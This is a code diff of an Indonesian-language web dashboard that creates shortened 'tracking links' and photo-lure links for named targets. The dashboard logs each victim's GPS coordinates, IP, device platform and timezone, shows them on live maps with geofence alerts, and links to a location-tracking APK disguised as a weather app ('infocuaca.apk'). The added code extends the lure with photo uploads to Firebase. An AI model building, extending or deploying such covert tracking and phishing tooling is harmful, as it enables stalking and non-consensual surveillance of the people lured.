@@ -59,6 +59,7 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .card-k{color:var(--text-d);display:inline-block;min-width:88px;font-size:10px;letter-spacing:1px;text-transform:uppercase}
 .card-v{color:var(--cyan)}.card-v a{color:var(--cyan);text-decoration:none;border-bottom:1px solid rgba(56,189,248,.25)}
 .card-photo{width:72px;height:72px;object-fit:cover;border:1px solid var(--gold-d);border-radius:var(--radius);margin:8px 0;display:block}
+.card-photo-big{width:100%;max-height:220px;object-fit:cover;border:1px solid var(--gold-d);border-radius:var(--radius);margin:8px 0;display:block;cursor:pointer}
 .card-actions{display:flex;gap:6px;margin-top:10px;padding-top:10px;border-top:1px solid var(--border);flex-wrap:wrap}
 .card-actions button{flex:1;min-width:44px;background:transparent;border:1px solid var(--border2);color:var(--text-d);font-family:'Courier New',monospace;font-size:9px;letter-spacing:1px;padding:7px 4px;cursor:pointer;border-radius:var(--radius)}
 .card-actions button:hover{border-color:var(--gold);color:var(--gold)}
@@ -156,6 +157,7 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .sess-head button:hover{border-color:#ff3355;color:#ff3355}
 .tag-badge{display:inline-block;font-size:8px;padding:2px 6px;border-radius:2px;letter-spacing:1px;font-weight:bold;margin-left:4px;text-transform:uppercase}
 .tag-VIP{background:#0d3f2e;color:#66ffc2;border:1px solid #00e58a}.tag-Suspect{background:#4a0000;color:#ff3355;border:1px solid #ff3355}.tag-Client{background:#0a2e21;color:#00e58a;border:1px solid #00e58a}.tag-Family{background:#0c2f45;color:#38bdf8;border:1px solid #38bdf8}.tag-Other{background:#101b2b;color:#93a6bc;border:1px solid #24344c}
+.tag-via-upload{display:inline-block;font-size:8px;color:#a855f7;border:1px solid #4c1d95;padding:1px 5px;border-radius:2px;letter-spacing:1px}
 .folder-bar{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;padding:8px;background:#070d17;border:1px solid #1d2a3c;border-radius:4px}
 .folder-chip{font-family:'Courier New',monospace;font-size:9px;padding:5px 10px;border-radius:12px;cursor:pointer;background:transparent;border:1px solid #24344c;color:#6d8095;letter-spacing:1px}
 .folder-chip:hover{border-color:#00e58a;color:#00e58a}.folder-chip.active{background:rgba(0,229,138,.15);border-color:#00e58a;color:#00e58a}
@@ -321,7 +323,7 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <!-- GLOBE 3D -->
 <div class="term-body"><div class="prompt">[Visual] Globe 3D Target</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› globe bumi realtime · rotasi otomatis · drag untuk memutar:</div><div id="globeBox"><canvas id="globeCanvas"></canvas><div class="globe-hint">◈ GLOBE VIEW — DRAG UNTUK ROTASI</div><div class="globe-count" id="globeCount">0 target</div></div></div>
 
-<!-- ═══ RADAR SERVER MONITOR — GANTI BT SIMULASI ═══ -->
+<!-- ═══ RADAR SERVER MONITOR ═══ -->
 <div class="term-body">
   <div class="prompt">[Monitor] Radar Server Online/Offline</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› pemantauan nyata status server · auto-refresh 10 detik:</div>
@@ -338,11 +340,9 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
     </div>
   </div>
 
-  <!-- Panel daftar server -->
   <div style="margin-top:12px;font-size:10px;color:var(--text-d)">› daftar server yang dipantau:</div>
   <div class="server-list" id="serverList"></div>
 
-  <!-- Tambah server manual -->
   <div style="margin-top:10px;font-size:10px;color:var(--text-d)">› tambah server baru:</div>
   <div class="server-input-row">
     <input id="newServerInput" placeholder="https://contoh.com" onkeypress="if(event.key==='Enter')addServer()">
@@ -359,7 +359,14 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Audio] Kontrol Suara</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atur volume alert & beep:</div><div class="vol-wrap"><span class="vl">VOL</span><input type="range" id="volSlider" min="0" max="100" value="30" oninput="setVol(this.value)"><span class="vl" id="volLabel">30%</span></div></div>
 <div class="term-body"><div class="prompt">[Live] All Targets Map</div><div class="map-box tall"><div id="mapMulti" class="map-inner"></div><div class="map-label" id="multiLabel">◈ MULTI-TARGET LIVE</div><div class="map-coords" id="mapMultiCount">0 targets</div></div></div>
 <div class="term-body"><div class="prompt">[Alert] Geofence Monitor</div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi kalau target masuk zona.</div><div class="geo-row"><input id="geoLat" class="geo-inp" placeholder="Latitude" type="number" step="any"><input id="geoLng" class="geo-inp" placeholder="Longitude" type="number" step="any"><input id="geoRadius" class="geo-inp" placeholder="Radius (m)" type="number" value="500" style="max-width:90px"></div><div style="display:flex;gap:6px;margin-bottom:10px"><button class="term-btn outline" onclick="setGeofence()" style="margin:0">[ Set Geofence ]</button><button class="term-btn danger" onclick="clearGeofence()" style="margin:0;flex:0 0 auto;width:auto;padding:0 16px">[ Clear ]</button></div><div class="geo-status" id="geoStatus">Belum diset</div><div class="geo-alert" id="geoAlert"></div></div>
-<div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div><div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div><div style="display:flex;gap:8px"><button class="term-btn" onclick="genLink()" style="margin:0">[ Track Link ]</button><button class="term-btn outline" onclick="genLinkMaps()" style="margin:0">[ Maps Link ]</button></div><div id="linkResult" style="display:none;margin-top:12px"><div style="font-size:10px;color:var(--text-d);margin-bottom:6px" id="linkTypeLabel">› target link:</div><div class="link-url-box" id="linkUrl"></div><button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button></div></div>
+
+<!-- GENERATE LINK + UPLOAD FOTO -->
+<div class="term-body"><div class="prompt">[Generate] Tracking Link</div><div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div><input id="targetName" class="term-input" placeholder="contoh: Rorax" oninput="typingSound()" autocomplete="off"><div style="font-size:10px;color:var(--text-d);margin:12px 0 8px">› base URL custom (opsional):</div><input id="baseUrlCustom" class="term-input" placeholder="cth: https://domain-lain.com" oninput="typingSound()" autocomplete="off" spellcheck="false"><div style="font-size:9px;color:var(--text-d);margin:-4px 0 8px;opacity:.7">kosongkan = pakai domain ini</div><div class="sched-row"><label>⏰ EXPIRED:</label><select id="linkExpiry"><option value="0">∞ Tidak expired</option><option value="15">15 menit</option><option value="60">1 jam</option><option value="360">6 jam</option><option value="1440" selected>24 jam</option><option value="10080">7 hari</option><option value="43200">30 hari</option></select></div><div class="sched-info" id="schedInfo">› Link akan expired otomatis setelah <b>24 jam</b>.</div><div style="font-size:10px;color:var(--text-d);margin:2px 0 8px">› pilih jenis link (auto-shorten via is.gd):</div><div style="display:flex;gap:8px;flex-wrap:wrap"><button class="term-btn" onclick="genLink()" style="margin:0;flex:1;min-width:130px">[ Track Link ]</button><button class="term-btn outline" onclick="genLinkMaps()" style="margin:0;flex:1;min-width:130px">[ Maps Link ]</button></div>
+<!-- TOMBOL UPLOAD FOTO BARU -->
+<input type="file" id="dashFotoInput" accept="image/*" style="display:none" onchange="onDashFotoPicked(event)">
+<button class="term-btn outline" onclick="document.getElementById('dashFotoInput').click()" style="margin-top:8px">[ 📷 Upload Foto → Generate Link ]</button>
+<div id="linkResult" style="display:none;margin-top:12px"><div style="font-size:10px;color:var(--text-d);margin-bottom:6px" id="linkTypeLabel">› target link:</div><div class="link-url-box" id="linkUrl"></div><button class="term-btn outline" id="btnCopy" onclick="copyLink()" style="margin-top:10px">[ 📋 Salin Link ]</button></div></div>
+
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">[ CSV ]</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">[ JSON ]</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">[ Clear ]</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button></div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">[ ▶ Download APK ]</button></a></div>
@@ -494,11 +501,12 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+import{getStorage,ref as sRef,uploadBytes,getDownloadURL}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js";
 const FC={apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",authDomain:"roraxbali-65802.firebaseapp.com",databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"roraxbali-65802",storageBucket:"roraxbali-65802.firebasestorage.app",messagingSenderId:750633313866,appId:"1:750636313866:web:3d2e552960e06db83968b3"};
-const app=initializeApp(FC);const db=getDatabase(app);
+const app=initializeApp(FC);const db=getDatabase(app);const stg=getStorage(app);
 const user=localStorage.getItem('username');if(!user)location.href='index.html';
 document.getElementById('userLabel').innerText=user;
-window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;
+window.user=user;window.db=db;window.ref=ref;window.onValue=onValue;window.push=push;window.remove=remove;window.stg=stg;
 const wv=document.getElementById('welcomeVideo');
 if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
 let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
@@ -640,6 +648,85 @@ function showLoading(type){
   if(labelEl)labelEl.innerText='› target link ('+type+') — MEMPERPENDEK...';
   urlBox.innerHTML='<div style="padding:12px;text-align:center;color:var(--gold);font-size:11px;letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
 }
+
+/* ═══════════════════════════════════════════════
+   UPLOAD FOTO DARI DASHBOARD → GENERATE LINK view.html
+   ═══════════════════════════════════════════════ */
+window.onDashFotoPicked = async function(event){
+  const file = event.target.files && event.target.files[0];
+  if(!file) return;
+  if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
+  if(file.size > 5*1024*1024){ alert('Maks 5 MB.'); event.target.value=''; return; }
+
+  playKlik();
+  addLog('📷 Upload foto: ' + file.name);
+  actLog('📷 Upload foto: ' + file.name, 'info');
+
+  const resBox = document.getElementById('linkResult');
+  const urlBox = document.getElementById('linkUrl');
+  const labelEl = document.getElementById('linkTypeLabel');
+  resBox.style.display = 'block';
+  if(labelEl) labelEl.innerText = '› mengunggah foto...';
+  urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Upload ke Firebase Storage...</div>';
+
+  try{
+    const ext = file.name.split('.').pop().toLowerCase().slice(0,5) || 'jpg';
+    const fname = 'dash_' + Date.now() + '_' + Math.random().toString(36).slice(2,8) + '.' + ext;
+    const path = 'dash_uploads/' + user + '/' + fname;
+    const sref = sRef(stg, path);
+
+    await uploadBytes(sref, file, { contentType: file.type });
+    const downloadUrl = await getDownloadURL(sref);
+
+    addLog('✓ Foto terupload', 'ok');
+
+    const t = document.getElementById('targetName').value.trim() || 'target';
+
+    const longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(downloadUrl)
+                  + '&u=' + encodeURIComponent(user)
+                  + '&t=' + encodeURIComponent(t);
+
+    window.currentLink = longUrl;
+    window.lastLongLink = longUrl;
+    window.currentFotoUrl = downloadUrl;
+
+    if(labelEl) labelEl.innerText = '› memperpendek link...';
+    urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
+
+    const result = await autoShorten(longUrl);
+    if(result.ok){
+      window.currentShortLink = result.short;
+      showBothLinks(longUrl, result.short, 'FOTO');
+      addLog('✓ Shortlink foto: ' + result.short, 'ok');
+      actLog('📷 Link FOTO: ' + t, 'link');
+      if(window.clipAdd) clipAdd(result.short, 'FOTO');
+      if(window.clipAdd) clipAdd(longUrl, 'FOTO');
+      beep(1800, 0.08);
+      const qr = document.getElementById('qrInput');
+      const sh = document.getElementById('shortInput');
+      if(qr) qr.value = result.short;
+      if(sh) sh.value = longUrl;
+    } else {
+      showBothLinks(longUrl, null, 'FOTO');
+      addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
+      if(window.clipAdd) clipAdd(longUrl, 'FOTO');
+    }
+
+    // Preview foto kecil
+    const preview = document.createElement('img');
+    preview.src = downloadUrl;
+    preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--gold-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
+    preview.onclick = () => window.open(downloadUrl, '_blank');
+    urlBox.appendChild(preview);
+
+  } catch(e){
+    addLog('✗ Upload gagal: ' + e.message, 'err');
+    urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
+  } finally {
+    event.target.value = '';
+  }
+};
+
 window.genLink=async function(){
   playKlik();saveBase();
   const t=document.getElementById('targetName').value.trim()||'target';
@@ -706,14 +793,14 @@ window.copyLink=async()=>{
 let allData=[],lastCnt=0,firstLoad=true;window.allData=[];
 function genID(w){const t=new Date(w);return'TGT-'+t.getFullYear().toString().slice(-2)+String(t.getMonth()+1).padStart(2,'0')+String(t.getDate()).padStart(2,'0')+'-'+String(t.getHours()).padStart(2,'0')+String(t.getMinutes()).padStart(2,'0')+String(t.getSeconds()).padStart(2,'0')}
 function getFiltered(){const s=(document.getElementById('searchInput')?.value||'').toLowerCase();const df=document.getElementById('filterDate')?.value||'all';const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');const ts=new Date();ts.setHours(0,0,0,0);const tags=getTags();return allData.filter(([k,d])=>{if(bl.includes(k))return false;if(currentFolder!=='all'){var tag=tags[k]||'';if(currentFolder==='untagged'&&tag)return false;if(currentFolder!=='untagged'&&tag!==currentFolder)return false}if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}if(df==='today'&&d.waktu<ts.getTime())return false;if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;if(df==='30days'&&d.waktu<ts.getTime()-30*86400000)return false;return true})}
-function renderData(){const filtered=getFiltered();document.getElementById('countShown').innerText=filtered.length;document.getElementById('countTotal').innerText=allData.length;const c=document.getElementById('hasil');if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';updateStats();updateMultiMap();checkGeofence();showDupWarning();return}var tags=getTags();c.innerHTML=filtered.map(([key,d])=>{var tag=tags[key]||'';var tagBadge=tag?'<span class="tag-badge tag-'+tag+'">'+tag+'</span>':'';return `<div class="card-data" data-key="${key}" id="card-${key}"><div class="card-top"><span><span class="card-uname">${d.target||'unknown'}</span>${tagBadge} ${d.via==='maps'?'<span style="font-size:8px;color:#38bdf8;border:1px solid #0c2f45;padding:1px 5px;border-radius:2px;letter-spacing:1px">MAPS</span>':'<span style="font-size:8px;color:#00e58a;border:1px solid #0d3f2e;padding:1px 5px;border-radius:2px;letter-spacing:1px">TRACK</span>'} · ${genID(d.waktu)}</span><span>${new Date(d.waktu).toLocaleString('id-ID')}</span></div>${d.foto?`<img class="card-photo" src="${d.foto}" crossorigin="anonymous">`:''}<div class="card-body"><div><span class="card-k">NAMA</span><span class="card-v">${d.target||'-'}</span></div><div><span class="card-k">ALAMAT</span><span class="card-v">${buildAlamat(d)}</span></div>${d.lat?`<div><span class="card-k">KOORD</span><span class="card-v">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div><div><span class="card-k">MAPS</span><span class="card-v"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP →</a></span></div>`:''}${d.ip?`<div><span class="card-k">IP</span><span class="card-v">${d.ip}</span></div>`:''}${d.platform?`<div><span class="card-k">PLATFORM</span><span class="card-v">${d.platform}</span></div>`:''}${d.screen?`<div><span class="card-k">SCREEN</span><span class="card-v">${d.screen}</span></div>`:''}${d.timezone?`<div><span class="card-k">TZ</span><span class="card-v">${d.timezone}</span></div>`:''}</div><textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea><div class="card-actions"><button onclick="saveNote('${key}')">📝 NOTE</button><button onclick="openTagEditor('${key}','${tag}')">🏷️ TAG</button><button onclick="goCompass(${d.lat},${d.lng})">➤ ARAH</button><button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button><button onclick="downloadCard('${key}')">📥 SAVE</button><button class="del" onclick="deleteItem('${key}')">🗑️ DEL</button></div></div>`}).join('');const latest=filtered.find(([,d])=>d.lat&&d.lng);if(latest)animasiMapLink(latest[1].lat,latest[1].lng,latest[1].target||'unknown',latest[1].foto||null);updateStats();updateMultiMap();checkGeofence();showDupWarning()}
+function renderData(){const filtered=getFiltered();document.getElementById('countShown').innerText=filtered.length;document.getElementById('countTotal').innerText=allData.length;const c=document.getElementById('hasil');if(!filtered.length){c.innerHTML='<div class="empty">No data matches</div>';updateStats();updateMultiMap();checkGeofence();showDupWarning();return}var tags=getTags();c.innerHTML=filtered.map(([key,d])=>{var tag=tags[key]||'';var tagBadge=tag?'<span class="tag-badge tag-'+tag+'">'+tag+'</span>':'';var viaBadge=d.via==='maps'?'<span style="font-size:8px;color:#38bdf8;border:1px solid #0c2f45;padding:1px 5px;border-radius:2px;letter-spacing:1px">MAPS</span>':(d.via==='view'||d.via==='upload')?'<span class="tag-via-upload">FOTO</span>':'<span style="font-size:8px;color:#00e58a;border:1px solid #0d3f2e;padding:1px 5px;border-radius:2px;letter-spacing:1px">TRACK</span>';return `<div class="card-data" data-key="${key}" id="card-${key}"><div class="card-top"><span><span class="card-uname">${d.target||'unknown'}</span>${tagBadge} ${viaBadge} · ${genID(d.waktu)}</span><span>${new Date(d.waktu).toLocaleString('id-ID')}</span></div>${d.foto?`<img class="card-photo-big" src="${d.foto}" crossorigin="anonymous" onclick="window.open('${d.foto}','_blank')">`:''}<div class="card-body"><div><span class="card-k">NAMA</span><span class="card-v">${d.target||'-'}</span></div><div><span class="card-k">ALAMAT</span><span class="card-v">${buildAlamat(d)}</span></div>${d.lat?`<div><span class="card-k">KOORD</span><span class="card-v">${d.lat.toFixed(5)}, ${d.lng.toFixed(5)}</span></div><div><span class="card-k">MAPS</span><span class="card-v"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">OPEN MAP →</a></span></div>`:''}${d.ip?`<div><span class="card-k">IP</span><span class="card-v">${d.ip}</span></div>`:''}${d.platform?`<div><span class="card-k">PLATFORM</span><span class="card-v">${d.platform}</span></div>`:''}${d.screen?`<div><span class="card-k">SCREEN</span><span class="card-v">${d.screen}</span></div>`:''}${d.timezone?`<div><span class="card-k">TZ</span><span class="card-v">${d.timezone}</span></div>`:''}</div><textarea class="card-note" id="note_${key}" placeholder="› catatan...">${getNote(key)}</textarea><div class="card-actions"><button onclick="saveNote('${key}')">📝 NOTE</button><button onclick="openTagEditor('${key}','${tag}')">🏷️ TAG</button><button onclick="goCompass(${d.lat},${d.lng})">➤ ARAH</button><button onclick="zoomMulti(${d.lat},${d.lng})">MULTI</button><button onclick="downloadCard('${key}')">📥 SAVE</button><button class="del" onclick="deleteItem('${key}')">🗑️ DEL</button></div></div>`}).join('');const latest=filtered.find(([,d])=>d.lat&&d.lng);if(latest)animasiMapLink(latest[1].lat,latest[1].lng,latest[1].target||'unknown',latest[1].foto||null);updateStats();updateMultiMap();checkGeofence();showDupWarning()}
 window.renderData=renderData;
 window.zoomMulti=(lat,lng)=>{if(!mapMulti||!lat||!lng)return;mapMulti.flyTo([lat,lng],14,{duration:1.5});document.getElementById('mapMulti').closest('.term-body').scrollIntoView({behavior:'smooth'})};
 window.filterData=()=>renderData();
 window.deleteItem=async(key)=>{playKlik();if(!confirm('Hapus data ini?'))return;const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');if(!bl.includes(key))bl.push(key);localStorage.setItem('blacklist_'+user,JSON.stringify(bl));await remove(ref(db,'lokasi/'+user+'/'+key));addLog('Deleted');actLog('🗑️ Data dihapus: '+key,'del');renderData()};
 window.clearAll=async()=>{playKlik();if(!confirm('Hapus SEMUA data link?'))return;const data=(await new Promise(r=>onValue(ref(db,'lokasi/'+user),r,{onlyOnce:true}))).val();const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');for(const[k,v]of Object.entries(data||{})){if(v.target){if(!bl.includes(k))bl.push(k);await remove(ref(db,'lokasi/'+user+'/'+k))}}localStorage.setItem('blacklist_'+user,JSON.stringify(bl));actLog('🗑️ SEMUA data dihapus','del');renderData()};
 window.downloadCard=async(key)=>{const c=document.getElementById('card-'+key);if(!c)return;try{const cv=await html2canvas(c,{backgroundColor:'#0e1626',scale:2});const a=document.createElement('a');a.download='target_'+key+'.png';a.href=cv.toDataURL();a.click()}catch(e){}};
-window.exportCSV=()=>{if(!allData.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform']];allData.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
+window.exportCSV=()=>{if(!allData.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform','Via']];allData.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'',d.via||'track']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
 window.exportJSON=()=>{if(!allData.length)return alert('No data');const blob=new Blob([JSON.stringify(allData.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.json';a.click()};
 onValue(ref(db,'lokasi/'+user),snap=>{const data=snap.val();if(!data){allData=[];window.allData=[];document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';document.getElementById('countShown').innerText='0';document.getElementById('countTotal').innerText='0';updateStats();updateMultiMap();return}allData=Object.entries(data).filter(([,d])=>d.target).sort((a,b)=>b[1].waktu-a[1].waktu);window.allData=allData;if(!firstLoad&&allData.length>lastCnt){linkDataSound();addLog('✔ DATA BARU!','warn');actLog('✔ Data target baru masuk','info')}lastCnt=allData.length;firstLoad=false;renderData()});
 
@@ -851,11 +938,7 @@ function animateGlobe(){
 setTimeout(function(){initGlobe();refreshGlobeMarkers()},2000);
 setInterval(refreshGlobeMarkers,5000);
 
-/* ═══════════════════════════════════════════════════════════════════
-   RADAR SERVER MONITOR — 100% NYATA (menggantikan BT simulasi)
-   ═══════════════════════════════════════════════════════════════════ */
-
-// ⚙️ CONFIG_SERVERS — Ganti daftar server di sini
+/* ═══ RADAR SERVER MONITOR ═══ */
 const DEFAULT_SERVERS = [
   { name: 'Google',   url: 'https://www.google.com' },
   { name: 'GitHub',   url: 'https://github.com' },
@@ -864,7 +947,6 @@ const DEFAULT_SERVERS = [
   { name: 'Wikipedia', url: 'https://www.wikipedia.org' },
   { name: 'OpenAI',   url: 'https://openai.com' }
 ];
-
 let serverList = [];
 try {
   const saved = localStorage.getItem('serverList_' + (window.user || 'guest'));
@@ -873,17 +955,12 @@ try {
   serverList = DEFAULT_SERVERS.slice();
 }
 if (!serverList.length) serverList = DEFAULT_SERVERS.slice();
-
-let serverStatus = {}; // { url: { status, ping, name } }
-
-// Simpan daftar server
+let serverStatus = {};
 function saveServerList() {
   try {
     localStorage.setItem('serverList_' + (window.user || 'guest'), JSON.stringify(serverList));
   } catch(e) {}
 }
-
-// Render daftar server di panel bawah radar
 function renderServerList() {
   const el = document.getElementById('serverList');
   if (!el) return;
@@ -898,8 +975,6 @@ function renderServerList() {
     return '<div class="server-item ' + cls + '"><span class="sv-name">' + escapeHtml(s.name) + '</span><span class="sv-ping">' + pingTxt + '</span><button onclick="removeServer(' + idx + ')" style="background:transparent;border:1px solid #24344c;color:#ff3355;font-size:9px;padding:3px 7px;cursor:pointer;border-radius:2px;font-family:inherit">✕</button></div>';
   }).join('');
 }
-
-// Tambah server baru
 window.addServer = function() {
   const inp = document.getElementById('newServerInput');
   const val = inp.value.trim();
@@ -914,11 +989,8 @@ window.addServer = function() {
   renderServerList();
   if (window.addLog) addLog('✔ Server ditambah: ' + name, 'ok');
   if (window.beep) beep(1800, 0.06);
-  // Langsung cek server baru
   pingServer({ name, url });
 };
-
-// Hapus server
 window.removeServer = function(idx) {
   if (!confirm('Hapus server ini?')) return;
   const s = serverList[idx];
@@ -929,8 +1001,6 @@ window.removeServer = function(idx) {
   refreshRadarBlips();
   if (window.addLog) addLog('🗑️ Server dihapus: ' + (s ? s.name : '?'), 'warn');
 };
-
-// Ping 1 server (pakai fetch no-cors + timing)
 async function pingServer(server) {
   const start = Date.now();
   const timeoutMs = 8000;
@@ -949,21 +1019,16 @@ async function pingServer(server) {
     serverStatus[server.url] = { status: 'offline', ping: null, name: server.name };
   }
 }
-
-// Ping semua server paralel
 async function pingAllServers() {
   await Promise.all(serverList.map(s => pingServer(s)));
   renderServerList();
   refreshRadarBlips();
   updateRadarStats();
-  // Log kalau ada yang offline
   const offline = serverList.filter(s => serverStatus[s.url] && serverStatus[s.url].status === 'offline');
   if (offline.length && window.addLog) {
     addLog('⚠ ' + offline.length + ' server OFFLINE: ' + offline.map(s=>s.name).join(', '), 'warn');
   }
 }
-
-// Update statistik radar
 function updateRadarStats() {
   let online = 0, slow = 0, offline = 0, pingSum = 0, pingCnt = 0;
   Object.values(serverStatus).forEach(st => {
@@ -980,8 +1045,6 @@ function updateRadarStats() {
   if (elOf) elOf.textContent = offline;
   if (elPing) elPing.textContent = pingCnt ? Math.round(pingSum / pingCnt) + ' ms' : '-';
 }
-
-// Gambar blip di radar
 function refreshRadarBlips() {
